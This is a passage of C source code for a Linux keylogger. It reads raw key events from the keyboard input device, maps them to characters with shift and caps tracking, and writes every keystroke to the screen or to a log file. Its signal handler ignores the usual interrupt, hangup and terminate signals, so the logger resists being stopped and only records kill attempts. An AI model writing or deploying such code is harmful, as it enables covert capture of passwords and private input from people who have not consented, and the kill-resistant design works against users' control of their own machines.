	{"[KEY_JOURNAL]", "[SHIFT+KEY_JOURNAL]"}, 
	{"[KEY_CONTROLPANEL]", "[SHIFT+KEY_CONTROLPANEL]"}, 
	{"[KEY_APPSELECT]", "[SHIFT+KEY_APPSELECT]"}, 
	{"[KEY_SCREENSAVER]", "[SHIFT+KEY_SCREENSAVER]"}, 
	{"[KEY_VOICECOMMAND]", "[SHIFT+KEY_VOICECOMMAND]"}, 
	{"[KEY_ASSISTANT]", "[SHIFT+KEY_ASSISTANT]"}, 
	{"[KEY_KBD_LAYOUT_NEXT]", "[SHIFT+KEY_KBD_LAYOUT_NEXT]"}, 
	{"[KEY_BRIGHTNESS_MIN]", "[SHIFT+KEY_BRIGHTNESS_MIN]"}, 
	{"[KEY_BRIGHTNESS_MAX]", "[SHIFT+KEY_BRIGHTNESS_MAX]"}, 
	{"[KEY_KBDINPUTASSIST_PREV]", "[SHIFT+KEY_KBDINPUTASSIST_PREV]"}, 
	{"[KEY_KBDINPUTASSIST_NEXT]", "[SHIFT+KEY_KBDINPUTASSIST_NEXT]"}, 
	{"[KEY_KBDINPUTASSIST_PREVGROUP]", "[SHIFT+KEY_KBDINPUTASSIST_PREVGROUP]"}, 
	{"[KEY_KBDINPUTASSIST_NEXTGROUP]", "[SHIFT+KEY_KBDINPUTASSIST_NEXTGROUP]"}, 
	{"[KEY_KBDINPUTASSIST_ACCEPT]", "[SHIFT+KEY_KBDINPUTASSIST_ACCEPT]"}, 
	{"[KEY_KBDINPUTASSIST_CANCEL]", "[SHIFT+KEY_KBDINPUTASSIST_CANCEL]"}, 
	{"[KEY_RIGHT_UP]", "[SHIFT+KEY_RIGHT_UP]"}, 
	{"[KEY_RIGHT_DOWN]", "[SHIFT+KEY_RIGHT_DOWN]"}, 
	{"[KEY_LEFT_UP]", "[SHIFT+KEY_LEFT_UP]"}, 
	{"[KEY_LEFT_DOWN]", "[SHIFT+KEY_LEFT_DOWN]"}, 
	{"[KEY_ROOT_MENU]", "[SHIFT+KEY_ROOT_MENU]"}, 
	{"[KEY_MEDIA_TOP_MENU]", "[SHIFT+KEY_MEDIA_TOP_MENU]"}, 
	{"[KEY_NUMERIC_11]", "[SHIFT+KEY_NUMERIC_11]"}, 
	{"[KEY_NUMERIC_12]", "[SHIFT+KEY_NUMERIC_12]"}, 
	{"[KEY_AUDIO_DESC]", "[SHIFT+KEY_AUDIO_DESC]"}, 
	{"[KEY_3D_MODE]", "[SHIFT+KEY_3D_MODE]"}, 
	{"[KEY_NEXT_FAVORITE]", "[SHIFT+KEY_NEXT_FAVORITE]"}, 
	{"[KEY_STOP_RECORD]", "[SHIFT+KEY_STOP_RECORD]"}, 
	{"[KEY_PAUSE_RECORD]", "[SHIFT+KEY_PAUSE_RECORD]"}, 
	{"[KEY_VOD]", "[SHIFT+KEY_VOD]"}, 
	{"[KEY_UNMUTE]", "[SHIFT+KEY_UNMUTE]"}, 
	{"[KEY_FASTREVERSE]", "[SHIFT+KEY_FASTREVERSE]"}, 
	{"[KEY_SLOWREVERSE]", "[SHIFT+KEY_SLOWREVERSE]"}, 
	{"[KEY_DATA]", "[SHIFT+KEY_DATA]"}, 
	{"[KEY_ONSCREEN_KEYBOARD]", "[SHIFT+KEY_ONSCREEN_KEYBOARD]"}, 
	{"[KEY_PRIVACY_SCREEN_TOGGLE]", "[SHIFT+KEY_PRIVACY_SCREEN_TOGGLE]"}, 
	{"[KEY_SELECTIVE_SCREENSHOT]", "[SHIFT+KEY_SELECTIVE_SCREENSHOT]"}, 
	{"[KEY_MACRO1]", "[SHIFT+KEY_MACRO1]"}, 
	{"[KEY_MACRO2]", "[SHIFT+KEY_MACRO2]"}, 
	{"[KEY_MACRO3]", "[SHIFT+KEY_MACRO3]"}, 
	{"[KEY_MACRO4]", "[SHIFT+KEY_MACRO4]"}, 
	{"[KEY_MACRO5]", "[SHIFT+KEY_MACRO5]"}, 
	{"[KEY_MACRO6]", "[SHIFT+KEY_MACRO6]"}, 
	{"[KEY_MACRO7]", "[SHIFT+KEY_MACRO7]"}, 
	{"[KEY_MACRO8]", "[SHIFT+KEY_MACRO8]"}, 
	{"[KEY_MACRO9]", "[SHIFT+KEY_MACRO9]"}, 
	{"[KEY_MACRO10]", "[SHIFT+KEY_MACRO10]"}, 
	{"[KEY_MACRO11]", "[SHIFT+KEY_MACRO11]"}, 
	{"[KEY_MACRO12]", "[SHIFT+KEY_MACRO12]"}, 
	{"[KEY_MACRO13]", "[SHIFT+KEY_MACRO13]"}, 
	{"[KEY_MACRO14]", "[SHIFT+KEY_MACRO14]"}, 
	{"[KEY_MACRO15]", "[SHIFT+KEY_MACRO15]"}, 
	{"[KEY_MACRO16]", "[SHIFT+KEY_MACRO16]"}, 
	{"[KEY_MACRO17]", "[SHIFT+KEY_MACRO17]"}, 
	{"[KEY_MACRO18]", "[SHIFT+KEY_MACRO18]"}, 
	{"[KEY_MACRO19]", "[SHIFT+KEY_MACRO19]"}, 
	{"[KEY_MACRO20]", "[SHIFT+KEY_MACRO20]"}, 
	{"[KEY_MACRO21]", "[SHIFT+KEY_MACRO21]"}, 
	{"[KEY_MACRO22]", "[SHIFT+KEY_MACRO22]"}, 
	{"[KEY_MACRO23]", "[SHIFT+KEY_MACRO23]"}, 
	{"[KEY_MACRO24]", "[SHIFT+KEY_MACRO24]"}, 
	{"[KEY_MACRO25]", "[SHIFT+KEY_MACRO25]"}, 
	{"[KEY_MACRO26]", "[SHIFT+KEY_MACRO26]"}, 
	{"[KEY_MACRO27]", "[SHIFT+KEY_MACRO27]"}, 
	{"[KEY_MACRO28]", "[SHIFT+KEY_MACRO28]"}, 
	{"[KEY_MACRO29]", "[SHIFT+KEY_MACRO29]"}, 
	{"[KEY_MACRO30]", "[SHIFT+KEY_MACRO30]"}, 
	{"[KEY_MACRO_RECORD_START]", "[SHIFT+KEY_MACRO_RECORD_START]"}, 
	{"[KEY_MACRO_RECORD_STOP]", "[SHIFT+KEY_MACRO_RECORD_STOP]"}, 
	{"[KEY_MACRO_PRESET_CYCLE]", "[SHIFT+KEY_MACRO_PRESET_CYCLE]"}, 
	{"[KEY_MACRO_PRESET1]", "[SHIFT+KEY_MACRO_PRESET1]"}, 
	{"[KEY_MACRO_PRESET2]", "[SHIFT+KEY_MACRO_PRESET2]"}, 
	{"[KEY_MACRO_PRESET3]", "[SHIFT+KEY_MACRO_PRESET3]"}, 
	{"[KEY_KBD_LCD_MENU1]", "[SHIFT+KEY_KBD_LCD_MENU1]"}, 
	{"[KEY_KBD_LCD_MENU2]", "[SHIFT+KEY_KBD_LCD_MENU2]"}, 
	{"[KEY_KBD_LCD_MENU3]", "[SHIFT+KEY_KBD_LCD_MENU3]"}, 
	{"[KEY_KBD_LCD_MENU4]", "[SHIFT+KEY_KBD_LCD_MENU4]"}, 
	{"[KEY_KBD_LCD_MENU5]", "[SHIFT+KEY_KBD_LCD_MENU5]"}, 
	{"[KEY_MIN_INTERESTING]", "[SHIFT+KEY_MIN_INTERESTING]"}	
};

/*
const char* keymap_old[] =
{
	"KEY_RESERVED", "[ESCAPE]",
	"1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
	"-", "=",
	"[BACKSPACE]", "[TAB]",
	"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
	"{", "}", "[ENTER]", "[LCTRL]",
	"A", "S", "D", "F", "G", "H", "J", "K", "L",
	";", "'", "`", "[LSHIFT]", "\\",
	"Z", "X", "C", "V", "B", "N", "M",
	",", ".", "/", "[RSHIFT]", "*", "[LALT]", " ", "[CAPSLOCK]",
	"[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]",
	"[NUMLOCK]", "[SCROLLLOCK]",
	"&", "*", "(", "-", "$", "%", "^", "+", "!", "@", "#", ")", ">",
	"[ZENKAKUHANKAKU]", "[102ND]",
	"[F11]", "[F12]",
	"[KATAKANA]", "[HIRAGANA]", "[HENKAN]", "[KATAKANAHIRAGANA]", "[MUHENKAN]", "[KPJPCOMMA]",
	"\n", "[RCTRL]", "/",
	"[SYSRQ]",
	"[RALT]", "\n", "[HOME]", "[UP]", "[PAGEUP]", "[LEFT]", "[RIGHT]", "[END]", "[DOWN]", "[PAGEDOWN]", "[INSERT]", "[DELETE]",
	"[MACRO]", "[MUTE]", "[VOLDOWN]", "[VOLUP]", "[POWER]",
	"=", "+-", "[PAUSE]", "[SCALE]", "<"
};
*/


struct input_event keypress;
bool caps_active = false;


void write_to_log(char* content)
{
	// Check for error, otherwise we just write the content which is what we want
	if (write(log_fd, content, strlen(content)) == -1)
	{
		char errmsg[128];
		snprintf(errmsg, sizeof(errmsg), "Unable to write to '%s'", LOGFILE);
		perror(errmsg);
		exit(EXIT_FAILURE);
	}
}

void write_timestamp()
{
	const time_t timestamp_epoch = time(NULL);
	write_to_log(ctime(&timestamp_epoch));
}

void signal_handler(int signum)
{
	int length = snprintf(NULL, 0, "%d", signum);
	char signum_str[length+1];
	snprintf(signum_str, length+1, "%d", signum);

	// Ignore all other signals except SIGKILL (`kill -9`),
	// also make sure the file is still open before attempting to write to it.
	if (log_to_file && keys_fd != -1) {
		if (signum == SIGKILL) {
			write_to_log("\n[!] KILLED (");
			write_to_log(signum_str);
			write_to_log(") @ ");
			write_timestamp();
			write_to_log("\n");
			close(keys_fd); // closing the file will break the infinite while loop
		} else {
  		write_to_log("\n[!] Kill attempted (");
			write_to_log(signum_str);
			write_to_log("): ");
			write_timestamp();
			write_to_log("\n");
		}
	}
}

void set_signal_handling()
{ // catch SIGHUP, SIGINT, and SIGTERM signals to exit gracefully
	struct sigaction sact;
	sact.sa_handler = signal_handler;
	sigaction(SIGHUP, &sact, NULL);
	sigaction(SIGINT, &sact, NULL);
	sigaction(SIGTERM, &sact, NULL);  // this is the default signal sent with the `kill` command

	// prevent child processes from becoming zombies
	sact.sa_handler = SIG_IGN;
	sigaction(SIGCHLD, &sact, NULL);
}

void toggle_caps()
{
	caps_active = !caps_active;
}

char* get_key()
{
	// Ensure we're not attempting out-of-bounds access in our code-to-character mapping array
	// which would represent an unkown (currently unmapped) character.
	if (keypress.code+1 > sizeof(keymap)/sizeof(char*[2]))
		return "[UNKNOWN]";
	
	if (caps_active)
		return keymap[keypress.code][1];
	else
		return keymap[keypress.code][0];
}

int handle_key_event()
{
	char* key; // the intercepted key
	switch (keypress.value)
	{
		case 0: // key release
			// Release caps
			if (keypress.code == KEY_LEFTSHIFT || keypress.code == KEY_RIGHTSHIFT)
				toggle_caps();
			break;
		case 1: // key press
			// Holding or toggling caps
			if (keypress.code == KEY_LEFTSHIFT || keypress.code == KEY_RIGHTSHIFT || keypress.code == KEY_CAPSLOCK)
				toggle_caps();
			key = get_key();
			log_to_file ? write_to_log(key) : printf("%s", key);
			break;
		case 2: // key hold (repeating)
			// Get the key
			key = get_key();
			log_to_file ? write_to_log(key) : printf("%s", key);
			break;
		default:
			printf("You shouldn't have gotten here!\n");
			return 1;
	}

	//fflush(stdout); // needed to display string since it doesn't end with '\n'
	return 0;
}

void handle_file_error(char* filename)
{
		char errmsg[128];
		snprintf(errmsg, sizeof(errmsg), "Unable to read '%s'", filename);
		perror(errmsg);
		exit(EXIT_FAILURE);
}

int main(int argc, char *argv[])
{
	/*
	 * > https://www.kernel.org/doc/Documentation/input/input.txt
	 * > https://www.kernel.org/doc/html/v5.9/input/event-codes.html
	 *
	 * - `input_event` struct from `/usr/include/linux/input.h`
	 * - Uses standardized character codes as defined in `/usr/include/linux/input-event-codes.h`.
	 * - Event EV_KEY: "Used to describe state changes of keyboards, buttons, or other key-like devices."
	 *
	 * struct input_event {
	 * 	 struct timeval time;  // The timestamp. Struct contains seconds and microseconds since Unix epoch.
	 * 	 unsigned short type;  // Type of event such as "EV_KEY", "EV_PWR", "EV_LED", etc.
	 * 	 unsigned short code;  // Event code from `/usr/include/linux/input-event-codes.h`.
	 * 	 unsigned int   value; // Value the event carries.
	 * 	 											 // With event type EV_KEY, 0=release, 1=keypress, 2=autorepeat.
	 * }
	 */

	keys_fd = open(KEYBOARD_STREAM, O_RDONLY);
	if (keys_fd == -1) // We can't read it (probably not root)
		handle_file_error(KEYBOARD_STREAM);

	// Enable logging to file if specified by the user by running with the `-l` flag
	if (argc > 1)
	{
		if (strcmp(argv[1], "-l") == 0)  // they're equal
		{
			log_to_file = true;

			//                     v required Access Mode: one of O_RDONLY, O_WRONLY, or O_RDWR (see `man 2 open`)
			log_fd = open(LOGFILE, O_WRONLY | O_APPEND | O_CREAT);
			//                                ^ optional File Creation and/or Status flags
			if (log_fd == -1)
				handle_file_error(LOGFILE);
		}
	}

	set_signal_handling();

	// Disable stdout line buffering to print keystrokes in real time without needing to use something like `fflush(stdout)` after each `printf()`.
	// > https://stackoverflow.com/questions/1716296/why-does-printf-not-flush-after-the-call-unless-a-newline-is-in-the-format-strin
	setvbuf(stdout, NULL, _IONBF, 0);

	write_timestamp();
	write_to_log("\n");

	// Listen for keypresses
	while (true)
	{
		read(keys_fd, &keypress, sizeof(keypress));
		if (keypress.type == EV_KEY)
		{ // We only care about the keypress events
			handle_key_event();
		}
	}
}
